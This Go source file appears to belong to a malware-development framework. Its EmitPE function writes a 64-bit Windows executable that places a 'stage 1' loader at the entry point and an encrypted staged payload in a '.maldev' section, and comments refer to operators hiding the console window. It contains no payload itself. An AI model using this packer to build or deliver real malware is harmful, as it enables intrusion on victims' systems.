package host

import (
	"encoding/binary"
	"errors"
	"fmt"
)

// PEConfig parameterizes EmitPE.
type PEConfig struct {
	Stage1Bytes []byte // emitted asm — goes into .text
	PayloadBlob []byte // encoded stage 2 || encrypted payload — goes into .maldev
	Subsystem   uint16 // IMAGE_SUBSYSTEM_*; default WINDOWS_CUI = 3
}

// Sentinels.
var (
	ErrEmptyStage1 = errors.New("host: Stage1Bytes is empty")
	ErrEmptyPayload = errors.New("host: PayloadBlob is empty")
)

// PE format constants — keep them local to this package; debug/pe
// has the same values but its struct shapes don't fit our raw-byte
// emit pattern.
//
// Names and values are from Microsoft PE/COFF Specification Rev 12.0.
const (
	// dosMagic is the MZ signature at offset 0 in a DOS header.
	dosMagic = 0x5A4D
	// peSignature is the 4-byte "PE\0\0" at e_lfanew.
	peSignature = 0x00004550
	// peMachineAMD64 identifies an x86-64 image (§3.3.1).
	peMachineAMD64 = 0x8664
	// peMagicPE32Plus is the Optional Header magic for 64-bit images (§4).
	peMagicPE32Plus = 0x20B
	// subsystemCUI is IMAGE_SUBSYSTEM_WINDOWS_CUI — console app.
	// Default here so panics write to stderr during debugging.
	subsystemCUI = 3

	// DllCharacteristics bits (§4.3): NX-compat + ASLR-aware.
	dllCharNX       = 0x0100
	dllCharDynBase  = 0x0040

	// scnAlign / fileAlign are SectionAlignment / FileAlignment (§4.3).
	// Minimum legal FileAlignment per spec is 0x200; we stay at spec minimum.
	scnAlign  = 0x1000
	fileAlign = 0x200

	// Section Characteristics flags (§4.4):
	//   CODE | MEM_EXECUTE | MEM_READ
	scnExecRead = 0x60000020
	//   INITIALIZED_DATA | MEM_READ
	scnInitDataRead = 0x40000040
)

// Fixed-size layout fields (§2, §3, §4 of the spec).
const (
	dosHdrSize  = 0x40
	peSigSize   = 4
	coffHdrSize = 0x14
	// optHdrSize is the PE32+ Optional Header size, not including data
	// directories.  16 data directories × 8 bytes each = 0x80; standard
	// Optional Header body = 0x70; total = 0xF0.
	optHdrSize = 0xF0
	secHdrSize = 0x28
)

// EmitPE writes a complete PE32+ to the returned byte slice.
// Default subsystem is CUI (console) so panics print to stderr
// during debugging; production operators flip to GUI when the
// payload doesn't want a console window.
func EmitPE(cfg PEConfig) ([]byte, error) {
	if len(cfg.Stage1Bytes) == 0 {
		return nil, ErrEmptyStage1
	}
	if len(cfg.PayloadBlob) == 0 {
		return nil, ErrEmptyPayload
	}
	subsystem := cfg.Subsystem
	if subsystem == 0 {
		subsystem = subsystemCUI
	}

	numSections := uint16(2)

	// Layout: headers are file-aligned; sections are both file-aligned
	// (raw) and scnAlign-aligned (virtual).
	headersSize := dosHdrSize + peSigSize + coffHdrSize + optHdrSize + int(numSections)*secHdrSize
	headersSizeAligned := alignUp(uint32(headersSize), fileAlign)

	// .text section: stage-1 bytes, execute+read.
	textVirtSize := uint32(len(cfg.Stage1Bytes))
	textRawSize := alignUp(textVirtSize, fileAlign)
	textRVA := alignUp(headersSizeAligned, scnAlign)
	textRawOff := headersSizeAligned

	// .maldev section: payload blob, read-only initialized data.
	maldevVirtSize := uint32(len(cfg.PayloadBlob))
	maldevRawSize := alignUp(maldevVirtSize, fileAlign)
	maldevRVA := alignUp(textRVA+textVirtSize, scnAlign)
	maldevRawOff := textRawOff + textRawSize

	// SizeOfImage must be the virtual end of the last section, aligned
	// to SectionAlignment (§4.3).
	totalImageSize := alignUp(maldevRVA+maldevVirtSize, scnAlign)
	totalFileSize := maldevRawOff + maldevRawSize

	out := make([]byte, totalFileSize)

	// DOS Header — only the MZ magic and e_lfanew are significant to
	// the Windows loader; everything else is zeroed.
	binary.LittleEndian.PutUint16(out[0x00:0x02], dosMagic)
	binary.LittleEndian.PutUint32(out[0x3C:0x40], dosHdrSize) // e_lfanew

	off := uint32(dosHdrSize)

	// PE Signature ("PE\0\0").
	binary.LittleEndian.PutUint32(out[off:off+4], peSignature)
	off += peSigSize

	// COFF File Header (§3.3).
	binary.LittleEndian.PutUint16(out[off:off+2], peMachineAMD64) // Machine
	binary.LittleEndian.PutUint16(out[off+2:off+4], numSections)  // NumberOfSections
	binary.LittleEndian.PutUint32(out[off+4:off+8], 0)            // TimeDateStamp (reproducible)
	binary.LittleEndian.PutUint32(out[off+8:off+12], 0)           // PointerToSymbolTable
	binary.LittleEndian.PutUint32(out[off+12:off+16], 0)          // NumberOfSymbols
	binary.LittleEndian.PutUint16(out[off+16:off+18], optHdrSize)  // SizeOfOptionalHeader
	// Characteristics: EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE (§3.3.1)
	binary.LittleEndian.PutUint16(out[off+18:off+20], 0x0022)
	off += coffHdrSize

	// Optional Header — PE32+ layout (§4.3).
	// Offsets below are relative to the start of the Optional Header.
	binary.LittleEndian.PutUint16(out[off+0:off+2], peMagicPE32Plus)     // Magic
	out[off+2] = 14                                                        // MajorLinkerVersion
	out[off+3] = 0                                                         // MinorLinkerVersion
	binary.LittleEndian.PutUint32(out[off+4:off+8], textRawSize)          // SizeOfCode
	binary.LittleEndian.PutUint32(out[off+8:off+12], maldevRawSize)       // SizeOfInitializedData
	binary.LittleEndian.PutUint32(out[off+12:off+16], 0)                  // SizeOfUninitializedData
	binary.LittleEndian.PutUint32(out[off+16:off+20], textRVA)            // AddressOfEntryPoint == .text RVA
	binary.LittleEndian.PutUint32(out[off+20:off+24], textRVA)            // BaseOfCode
	binary.LittleEndian.PutUint64(out[off+24:off+32], 0x140000000)        // ImageBase (preferred)
	binary.LittleEndian.PutUint32(out[off+32:off+36], scnAlign)           // SectionAlignment
	binary.LittleEndian.PutUint32(out[off+36:off+40], fileAlign)          // FileAlignment
	binary.LittleEndian.PutUint16(out[off+40:off+42], 6)                  // MajorOperatingSystemVersion
	binary.LittleEndian.PutUint16(out[off+42:off+44], 0)                  // MinorOperatingSystemVersion
	binary.LittleEndian.PutUint16(out[off+44:off+46], 0)                  // MajorImageVersion
	binary.LittleEndian.PutUint16(out[off+46:off+48], 0)                  // MinorImageVersion
	binary.LittleEndian.PutUint16(out[off+48:off+50], 6)                  // MajorSubsystemVersion
	binary.LittleEndian.PutUint16(out[off+50:off+52], 0)                  // MinorSubsystemVersion
	binary.LittleEndian.PutUint32(out[off+52:off+56], 0)                  // Win32VersionValue (reserved, must be 0)
	binary.LittleEndian.PutUint32(out[off+56:off+60], totalImageSize)     // SizeOfImage
	binary.LittleEndian.PutUint32(out[off+60:off+64], headersSizeAligned) // SizeOfHeaders
	binary.LittleEndian.PutUint32(out[off+64:off+68], 0)                  // CheckSum
	binary.LittleEndian.PutUint16(out[off+68:off+70], subsystem)          // Subsystem
	binary.LittleEndian.PutUint16(out[off+70:off+72], dllCharNX|dllCharDynBase) // DllCharacteristics
	binary.LittleEndian.PutUint64(out[off+72:off+80], 0x100000)           // SizeOfStackReserve
	binary.LittleEndian.PutUint64(out[off+80:off+88], 0x1000)             // SizeOfStackCommit
	binary.LittleEndian.PutUint64(out[off+88:off+96], 0x100000)           // SizeOfHeapReserve
	binary.LittleEndian.PutUint64(out[off+96:off+104], 0x1000)            // SizeOfHeapCommit
	binary.LittleEndian.PutUint32(out[off+104:off+108], 0)                // LoaderFlags (reserved, must be 0)
	binary.LittleEndian.PutUint32(out[off+108:off+112], 16)               // NumberOfRvaAndSizes
	// 16 data directories follow — all zeroed (no imports, exports, TLS, etc.).
	off += optHdrSize

	// Section Headers — two entries, each secHdrSize (0x28) bytes.
	writeSection(out[off:off+secHdrSize], ".text", textVirtSize, textRVA, textRawSize, textRawOff, scnExecRead)
	off += secHdrSize
	writeSection(out[off:off+secHdrSize], ".maldev", maldevVirtSize, maldevRVA, maldevRawSize, maldevRawOff, scnInitDataRead)

	// Section bodies.
	copy(out[textRawOff:textRawOff+uint32(len(cfg.Stage1Bytes))], cfg.Stage1Bytes)
	copy(out[maldevRawOff:maldevRawOff+uint32(len(cfg.PayloadBlob))], cfg.PayloadBlob)

	return out, nil
}

// writeSection fills a 0x28-byte section header in dst (§4.4).
// The name is truncated to 8 bytes as the spec requires (names longer
// than 8 bytes need a string-table reference, which we don't need here).
func writeSection(dst []byte, name string, virtSize, virtAddr, rawSize, rawOff uint32, characteristics uint32) {
	if len(dst) < secHdrSize {
		panic(fmt.Sprintf("host: writeSection: dst too small: %d", len(dst)))
	}
	// dst is a sub-slice of out (make([]byte, …)), already zeroed.
	copy(dst[0:8], name) // Name[8] — zero-padded
	binary.LittleEndian.PutUint32(dst[8:12], virtSize)          // VirtualSize
	binary.LittleEndian.PutUint32(dst[12:16], virtAddr)         // VirtualAddress
	binary.LittleEndian.PutUint32(dst[16:20], rawSize)          // SizeOfRawData
	binary.LittleEndian.PutUint32(dst[20:24], rawOff)           // PointerToRawData
	// PointerToRelocations, PointerToLinenumbers, counts: all zero.
	binary.LittleEndian.PutUint32(dst[36:40], characteristics)  // Characteristics
}

// alignUp rounds v up to the next multiple of align.
// align must be a power of two.
func alignUp(v, align uint32) uint32 {
	return (v + align - 1) &^ (align - 1)
}
